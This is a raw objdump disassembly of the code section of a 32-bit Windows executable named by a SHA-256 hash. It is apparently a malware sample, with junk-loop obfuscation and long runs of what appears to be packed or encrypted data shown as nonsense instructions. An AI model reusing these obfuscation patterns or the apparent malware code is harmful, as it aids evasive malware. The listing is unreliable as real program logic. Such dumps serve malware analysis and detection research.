
cc450f46475e131325c7b642961c1aa45f3d095ea9a31d800c5bcf5e81d13f4c.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433717,0x1c
  401013:	cmp    DWORD PTR ds:0x433717,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433717,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433717,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433717
  401055:	dec    eax
  401056:	mov    ds:0x433717,eax
  40105b:	mov    eax,ds:0x433717
  401060:	dec    eax
  401061:	mov    ds:0x433717,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43371b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43371f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x433753
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x43372f
  4010b0:	sbb    ebx,DWORD PTR ds:0x433713
  4010b6:	mov    DWORD PTR ds:0x43372f,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x4337ab,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x43372f,0x18
  4010e5:	cmp    DWORD PTR ds:0x43372f,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x43372f,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x43372f,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x43372f
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x43372f,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x43372f
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x43372f,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x4336f7
  40113c:	mov    eax,ds:0x4337b3
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43379b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x43367f,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43369f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x4336db,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     BYTE PTR [eax],al
  4011b8:	push   esp
  4011b9:	push   ecx
  4011ba:	fdivr  DWORD PTR [esi+0x7e]
  4011bd:	jle    0x40123d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    dl,bh
  4011d1:	add    BYTE PTR [edi],cl
  4011d3:	xor    ecx,DWORD PTR [edi]
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x351eb73a
  40126d:	bound  esp,QWORD PTR [edx+0x3b]
  401270:	lahf   
  401271:	push   eax
  401272:	add    al,0x3d
  401274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401275:	sbb    eax,0xd118749d
  40127a:	ins    DWORD PTR es:[edi],dx
  40127b:	and    cl,ch
  40127d:	(bad)  
  40127e:	lods   eax,DWORD PTR ds:[esi]
  40127f:	adc    edx,DWORD PTR [ecx+edi*1+0x6aebc167]
  401286:	jbe    0x401255
  401288:	aas    
  401289:	sub    dl,ch
  40128b:	inc    BYTE PTR [edi+0x78]
  40128e:	shr    DWORD PTR [esi],1
  401290:	lock push ebx
  401292:	inc    esi
  401293:	dec    DWORD PTR [ebx-0x45d36f0f]
  401299:	(bad)  
  40129a:	popa   
  40129b:	pop    ebx
  40129c:	or     ch,BYTE PTR [edi]
  40129e:	push   eax
  40129f:	(bad)  
  4012a0:	push   edx
  4012a1:	jl     0x4012ac
  4012a3:	int    0x81
  4012a5:	or     DWORD PTR [edi],esp
  4012a7:	add    al,0x3
  4012a9:	mov    cl,0x45
  4012ab:	pop    ss
  4012ac:	inc    al
  4012ae:	popf   
  4012af:	ins    BYTE PTR es:[edi],dx
  4012b0:	mov    dh,0x80
  4012b2:	fstp   TBYTE PTR [ecx-0x2d]
  4012b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012b6:	and    eax,0x3f302b20
  4012bb:	sub    DWORD PTR [esi-0x4a5e24e2],0xffffffc8
  4012c2:	out    0xc0,eax
  4012c4:	fdivr  st,st(4)
  4012c6:	cs popa 
  4012c8:	cmp    eax,0xe6e04cfc
  4012cd:	and    BYTE PTR [edx-0x55fec31d],bl
  4012d3:	jae    0x401267
  4012d5:	addr16 fdivrp st(2),st
  4012d8:	sbb    eax,0xa7b1caea
  4012dd:	out    0xae,al
  4012df:	aas    
  4012e0:	into   
  4012e1:	out    0xf,al
  4012e3:	repz ret 
  4012e5:	sub    ebp,DWORD PTR [eax]
  4012e7:	jo     0x4012fe
  4012e9:	adc    al,ch
  4012eb:	push   esp
  4012ec:	sbb    BYTE PTR [esi+0x105dd2ee],0x74
  4012f3:	push   ecx
  4012f4:	mov    edi,0x7f7d14c7
  4012f9:	ficomp WORD PTR ds:0x93195a08
  4012ff:	adc    eax,0xbdc9d582
  401304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401305:	inc    esi
  401306:	inc    ebp
  401307:	pop    ebx
  401308:	xor    BYTE PTR [ecx+0x2ad9511a],bl
  40130e:	cmp    BYTE PTR [ebp-0x59],ch
  401311:	xor    al,0x2e
  401313:	frstor [bx+si]
  401316:	mov    ds:0x28c47be0,al
  40131b:	sub    DWORD PTR [edi-0x49],ebx
  40131e:	pushf  
  40131f:	jmp    0xd817bd01
  401324:	mov    cs,WORD PTR [ebx+0x50]
  401327:	mov    esp,0xf480e95
  40132c:	loopne 0x401317
  40132e:	mov    DWORD PTR [edx],edx
  401330:	(bad)  
  401331:	fmul   QWORD PTR [ecx-0x43]
  401334:	sub    al,0x37
  401336:	push   ebx
  401337:	jo     0x40137b
  401339:	es fcmovne st,st(2)
  40133c:	popf   
  40133d:	(bad)  
  40133e:	mov    al,ds:0xa50a8962
  401343:	pop    ebp
  401344:	fmul   DWORD PTR [esi+ebx*1]
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x4336d3,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x4336d3
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x4336d3,ebx
  401366:	cmp    DWORD PTR ds:0x4336d3,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x4336d3,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43368b,0x43367f
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	mov    bh,0xa0
  4013b5:	xor    edi,DWORD PTR [edx]
  4013b7:	cli    
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x4013a0
  4013c0:	xor    dl,BYTE PTR [ebx+ebx*8-0x2f25d225]
  4013c7:	cmp    eax,0xad313af8
  4013cc:	cld    
  4013cd:	mov    cs,WORD PTR [eax-0x24fb6ef0]
  4013d3:	or     BYTE PTR [eax+0xe],bh
  4013d6:	sbb    al,0xd2
  4013d8:	aaa    
  4013d9:	retf   0xea16
  4013dc:	fnstcw WORD PTR [ebp-0x7ac018e6]
  4013e2:	xchg   esp,eax
  4013e3:	sbb    dh,ch
  4013e5:	mov    ds:0x18f12d8a,eax
  4013ea:	inc    edx
  4013eb:	jne    0x40137e
  4013ed:	or     al,0xfe
  4013ef:	add    al,0x8d
  4013f1:	mov    esp,0x637a3816
  4013f6:	mov    edi,0x47bab12c
  4013fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4013fc:	or     eax,0x715f6a71
  401401:	pop    es
  401402:	ror    ch,0x3b
  401405:	jo     0x4013fe
  401407:	shl    edi,cl
  401409:	outs   dx,DWORD PTR ds:[esi]
  40140a:	sbb    BYTE PTR [esi+0x3f1efa71],bl
  401410:	push   ss
  401411:	mov    esi,0x131196a7
  401416:	adc    DWORD PTR [ebp-0x1],ebx
  401419:	lods   eax,DWORD PTR ds:[esi]
  40141a:	(bad)  
  40141c:	fmul   QWORD PTR [ebp+0x23]
  401420:	jmp    0x401415
  401422:	fisttp QWORD PTR [ebx-0x26445262]
  401428:	inc    ecx
  401429:	sbb    ebp,ebx
  40142b:	push   ebp
  40142c:	bound  eax,QWORD PTR [ecx]
  40142e:	fst    QWORD PTR [edi-0xe777450]
  401434:	jmp    0x4a4:0x22c452e8
  40143b:	inc    edx
  40143c:	adc    eax,0xde9b6ed7
  401441:	pop    ds
  401442:	mov    al,ds:0xa60b6d05
  401447:	mov    eax,0x9d01ba21
  40144c:	sti    
  40144d:	out    0xa7,al
  40144f:	jb     0x40146d
  401451:	sbb    esp,eax
  401453:	call   0xcc90:0xac65e77b
  40145a:	jae    0x40147f
  40145c:	xchg   ebp,eax
  40145e:	jmp    0x91d7:0xa8de03a6
  401465:	pop    ebx
  401466:	sbb    BYTE PTR [ecx+0x38],cl
  401469:	hlt    
  40146a:	arpl   WORD PTR [ecx+0x68],ax
  40146d:	mov    ?,ebp
  40146f:	jmp    0xc031bcb6
  401474:	jecxz  0x40142d
  401476:	push   ds
  401477:	sahf   
  401478:	mov    edi,0xd5253ff8
  40147d:	div    DWORD PTR [ebx+0x1b51b64c]
  401483:	mov    ds:0x279ba3a4,eax
  401488:	jo     0x40146a
  40148a:	inc    edx
  40148b:	and    dh,ah
  40148d:	jb     0x401433
  40148f:	and    DWORD PTR [ecx-0x4f],0xb4acf334
  401496:	xchg   ebx,ebx
  401498:	dec    ecx
  401499:	jb     0x401445
  40149b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40149c:	push   cs
  40149d:	in     eax,dx
  40149e:	add    BYTE PTR [eax+0x6d],dl
  4014a1:	leave  
  4014a2:	sbb    ch,dl
  4014a4:	cmp    BYTE PTR [edi-0x5c],bl
  4014a7:	xor    DWORD PTR [edx+0x6e27592],0x17
  4014ae:	mov    edx,0xdf4ce401
  4014b3:	or     eax,0x77bab5eb
  4014b8:	sbb    BYTE PTR ds:0x178b8552,dl
  4014be:	pop    ecx
  4014bf:	into   
  4014c0:	dec    edx
  4014c1:	mov    bh,0x1f
  4014c3:	cmp    eax,0x89443ed
  4014c8:	inc    esp
  4014c9:	iret   
  4014ca:	int    0x3c
  4014cc:	out    0x83,eax
  4014ce:	mov    WORD PTR fs:[ebx],es
  4014d1:	loop   0x4014c1
  4014d3:	sbb    BYTE PTR [esi+0x7c6d9240],dh
  4014d9:	std    
  4014da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014db:	retf   0xf361
  4014de:	or     ebx,ebp
  4014e0:	sub    DWORD PTR [eax-0x60e972dd],0x8edf3a54
  4014ea:	sbb    BYTE PTR [ebp+0x51],ch
  4014ed:	cwde   
  4014ee:	fnstenv [eax+0x4a]
  4014f1:	sub    eax,0xdae0e952
  4014f6:	rcl    BYTE PTR [ebp-0x32],1
  4014f9:	out    dx,eax
  4014fa:	dec    edx
  4014fb:	adc    al,0xa7
  4014fd:	xchg   BYTE PTR [edx+ebp*2],cl
  401500:	ret    
  401501:	rcl    BYTE PTR [edi+0x50],1
  401504:	or     DWORD PTR [ecx+0x78a23e5c],edi
  40150a:	sbb    dh,al
  40150c:	pop    DWORD PTR [ecx+0x58]
  40150f:	pop    esp
  401510:	mov    eax,0xbede63a6
  401515:	inc    edx
  401516:	xchg   DWORD PTR [ecx+0x47],ebx
  401519:	inc    esi
  40151a:	dec    ebx
  40151b:	xchg   BYTE PTR [edx-0x85dd419],ah
  401521:	mov    ecx,0x539eb540
  401526:	mov    ecx,0x759507a8
  40152b:	icebp  
  40152c:	imul   ebp,ebp,0x81e84620
  401532:	ja     0x4014dd
  401534:	(bad)  
  401535:	and    ebx,ecx
  401537:	rcr    bl,1
  401539:	call   0xfde0589c
  40153e:	fnstcw WORD PTR [esi+0x5a]
  401541:	sub    eax,0xc4458b34
  401546:	xor    DWORD PTR ds:0x43368f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx+0x1f37ffe3]
  401564:	sbb    DWORD PTR [esi],eax
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x40151e
  40156e:	test   bl,cl
  401570:	or     al,0xcb
  401572:	div    DWORD PTR [ecx]
  401574:	clc    
  401575:	mov    edi,0x8e0a9662
  40157a:	nop
  40157b:	or     eax,0x697b75d9
  401580:	cmp    bl,BYTE PTR ds:0xc9f6d008
  401586:	ret    0x34e8
  401589:	pusha  
  40158a:	repnz cmp al,0xfb
  40158d:	pop    ebp
  40158e:	scas   al,BYTE PTR es:[edi]
  40158f:	push   ecx
  401590:	push   ss
  401591:	mov    ds:0x4b1f3972,eax
  401596:	enter  0xae0,0x3a
  40159a:	inc    esp
  40159b:	or     BYTE PTR [esi+0x71af5bb2],bl
  4015a1:	or     ebx,DWORD PTR [ecx+0x61]
  4015a4:	push   esp
  4015a5:	push   eax
  4015a6:	jle    0x4015da
  4015a8:	hlt    
  4015a9:	sub    al,0xa9
  4015ab:	shl    BYTE PTR [eax],1
  4015ad:	xchg   edi,eax
  4015ae:	ret    0xd13c
  4015b1:	fbstp  TBYTE PTR [ecx-0x3c]
  4015b4:	data16 loope 0x401597
  4015b7:	ins    BYTE PTR es:[edi],dx
  4015b8:	aas    
  4015b9:	or     al,0x20
  4015bb:	jae    0x4015b0
  4015bd:	push   eax
  4015be:	stos   BYTE PTR es:[edi],al
  4015bf:	daa    
  4015c0:	scas   al,BYTE PTR es:[edi]
  4015c1:	sub    eax,DWORD PTR [esi-0x7f81a77b]
  4015c7:	push   cs
  4015c8:	mov    edx,0x7d5b7ce
  4015cd:	out    dx,eax
  4015ce:	in     al,0x17
  4015d0:	mov    dh,0x5
  4015d2:	mov    WORD PTR [edi+0x7255192a],gs
  4015d8:	lock test BYTE PTR [eax+0x11],cl
  4015dc:	push   0xa255b3d1
  4015e1:	jae    0x401598
  4015e3:	xchg   esp,eax
  4015e4:	divps  xmm7,XMMWORD PTR [ebp+0x765c04d5]
  4015eb:	sbb    al,0xa9
  4015ed:	adc    al,0x44
  4015ef:	outs   dx,BYTE PTR ds:[esi]
  4015f0:	int    0x0
  4015f2:	int    0x70
  4015f4:	enter  0x870c,0xe3
  4015f8:	fisttp WORD PTR [eax+0x1109a31f]
  4015fe:	into   
  4015ff:	addr16 adc cl,cl
  401602:	mov    ecx,0x7479077a
  401607:	retf   
  401608:	mov    gs,ecx
  40160a:	out    0xd6,eax
  40160c:	repz dec ecx
  40160e:	loope  0x401636
  401610:	lock cmp edx,DWORD PTR [edi+0x47]
  401614:	in     al,0x2a
  401616:	imul   ebx,DWORD PTR [edx-0x4c1848c0],0x702eb528
  401620:	pop    ss
  401621:	(bad)  
  401622:	in     eax,0xbe
  401624:	fwait
  401625:	jbe    0x401620
  401627:	cdq    
  401628:	jnp    0x401640
  40162a:	dec    esi
  40162b:	push   ss
  40162c:	sub    eax,0xa3fe1098
  401631:	call   0xf74eb4fb
  401636:	push   cs
  401637:	push   ss
  401638:	bnd jmp 0x4dfea7bc
  40163e:	pavgb  mm1,QWORD PTR [edx-0x5e1a6634]
  401645:	inc    eax
  401646:	jg     0x4015cc
  401648:	repnz out 0xe5,al
  40164b:	xchg   edi,eax
  40164c:	sbb    cl,BYTE PTR [edi]
  40164e:	les    edi,FWORD PTR [ecx+0x44]
  401651:	mov    cl,0x86
  401653:	(bad)  
  401654:	mov    eax,ds:0xe6159c52
  401659:	xor    eax,0x5497a4c2
  40165e:	pop    esp
  40165f:	cdq    
  401660:	daa    
  401661:	adc    eax,0x16b3cead
  401666:	rcl    BYTE PTR [esi-0x50],0x43
  40166a:	dec    esp
  40166b:	xchg   edi,eax
  40166c:	xchg   esp,eax
  40166d:	xor    al,0xf2
  40166f:	call   0xd0fcdf80
  401674:	es push esp
  401676:	loopne 0x401693
  401678:	adc    DWORD PTR [ecx-0x72],esp
  40167b:	popa   
  40167c:	in     al,0x5
  40167e:	sub    BYTE PTR [edi],0x5e
  401681:	icebp  
  401682:	call   0x99aa:0xac215707
  401689:	cdq    
  40168a:	js     0x401646
  40168c:	into   
  40168d:	xchg   edx,eax
  40168e:	adc    al,0xf8
  401690:	mov    eax,ds:0xa80453e1
  401695:	cmp    dl,BYTE PTR [edx]
  401697:	into   
  401698:	sqrtps xmm3,XMMWORD PTR [ecx+0x2bcf80af]
  40169f:	xor    esi,DWORD PTR [esi]
  4016a1:	add    DWORD PTR [ecx+ebx*1],edx
  4016a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016a5:	fs jb  0x401694
  4016a8:	adc    al,BYTE PTR [ecx+0x19]
  4016ab:	add    DWORD PTR [eax+0x4bf12e8f],ebp
  4016b1:	mov    dl,0x4
  4016b3:	cs mov cl,0xf8
  4016b6:	mov    edi,0x6b1f7a55
  4016bb:	xchg   ecx,eax
  4016bc:	(bad)  
  4016bd:	(bad)  
  4016be:	jmp    0x4016dc
  4016c0:	jno    0x401703
  4016c2:	add    al,0x7e
  4016c4:	(bad)  
  4016c5:	cld    
  4016c6:	push   0xffffff9e
  4016c8:	fidivr DWORD PTR [eax+0x36]
  4016cb:	pushf  
  4016cc:	sub    DWORD PTR [ebx],0x8e48302a
  4016d2:	ds inc ebx
  4016d4:	inc    edi
  4016d5:	adc    al,0x46
  4016d7:	add    ebp,ecx
  4016d9:	in     al,0xd1
  4016db:	dec    ecx
  4016dc:	sti    
  4016dd:	mov    ds:0x7b67dfab,al
  4016e2:	and    DWORD PTR [edx+0x78],edx
  4016e5:	dec    ebx
  4016e6:	jmp    0x40167e
  4016e8:	jns    0x40173b
  4016ea:	in     eax,0xc4
  4016ec:	loope  0x4016ee
  4016ee:	imul   edx,DWORD PTR [ebx+0x63],0x3
  4016f2:	(bad)  
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x43375f,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x43375f
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x43375f,ebx
  401721:	cmp    DWORD PTR ds:0x43375f,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x43375f,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x43375f,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x43375f
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x43375f,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433683,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433697
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43368b
  401793:	and    ecx,DWORD PTR ds:0x4336db
  401799:	mov    DWORD PTR ds:0x43368b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x4337af,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x4337af
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x4337af,ebx
  4017c3:	cmp    DWORD PTR ds:0x4337af,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x4337af,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x4337af,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x4337af
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x4337af,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x433763,0x0
  401819:	mov    eax,ds:0x433763
  40181e:	inc    eax
  40181f:	mov    ds:0x433763,eax
  401824:	cmp    DWORD PTR ds:0x433763,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x4336a3
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x433763,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43379f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x4337ab,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x4337ab
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x4337ab,ecx
  401878:	cmp    DWORD PTR ds:0x4337ab,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x4337ab,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x4337ab,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x4337ab
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x4337ab,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0xa0c56ade
  4018e9:	sbb    al,0xa5
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x401889
  4018f4:	or     BYTE PTR ds:0x46dd0bad,bl
  4018fa:	inc    edx
  4018fb:	or     DWORD PTR [eax+ebx*2+0x7d7dd13],edi
  401902:	jo     0x4018db
  401904:	or     eax,0x4c4f29eb
  401909:	es pop eax
  40190b:	jmp    0x4018a7
  40190d:	pusha  
  40190e:	fld    TBYTE PTR [ebp-0x7d]
  401911:	mov    ds:0xf18c6138,eax
  401916:	push   ss
  401917:	fmul   DWORD PTR [eiz*4-0x6ce05001]
  40191e:	mov    DWORD PTR [ebx+esi*4],esi
  401921:	cmp    cl,BYTE PTR [edi-0x56f67e08]
  401927:	ja     0x401918
  401929:	aad    0x4c
  40192b:	sbb    DWORD PTR [edi-0x3c1320bd],esi
  401931:	imul   ch
  401933:	data16 jmp 0x4018d1
  401936:	loope  0x4018e1
  401938:	sahf   
  401939:	loope  0x4018d0
  40193b:	leave  
  40193c:	fnstcw WORD PTR [esi]
  40193e:	out    0xc6,al
  401940:	or     al,0x78
  401942:	gs scas eax,DWORD PTR es:[edi]
  401944:	xor    al,0xcb
  401946:	ins    BYTE PTR es:[edi],dx
  401947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401948:	outs   dx,BYTE PTR ds:[esi]
  401949:	fwait
  40194a:	pop    ebx
  40194b:	cwde   
  40194c:	pop    DWORD PTR [esi+esi*8+0x40c57ad1]
  401953:	js     0x4018e9
  401955:	mov    dh,0xf0
  401957:	loop   0x4019ac
  401959:	push   ebx
  40195a:	clc    
  40195b:	sbb    al,0xb7
  40195d:	xchg   ecx,eax
  40195e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40195f:	bound  eax,QWORD PTR [edi-0x28]
  401962:	dec    ebp
  401963:	gs xchg edi,eax
  401965:	jae    0x4018f2
  401967:	or     BYTE PTR [ecx+edi*2-0x5f],0x88
  40196c:	xchg   esp,eax
  40196d:	iret   
  40196e:	sub    al,0xfd
  401970:	test   BYTE PTR [edi-0x7f],ah
  401973:	adc    cl,BYTE PTR [ecx+0x484e57af]
  401979:	dec    ecx
  40197a:	dec    ebp
  40197b:	add    edx,DWORD PTR [edi]
  40197d:	mov    dl,0x3d
  40197f:	(bad)  
  401980:	cmc    
  401981:	stc    
  401982:	fucom  st(2)
  401984:	or     BYTE PTR [ebx],0x97
  401987:	or     DWORD PTR [eax*2-0x62ea2775],ebx
  40198e:	add    ebx,DWORD PTR [ecx-0x1e]
  401991:	call   0x1a3f2c05
  401996:	dec    ebx
  401997:	add    BYTE PTR [edx],dh
  401999:	aaa    
  40199a:	mov    bl,ch
  40199c:	fidivr DWORD PTR [edx]
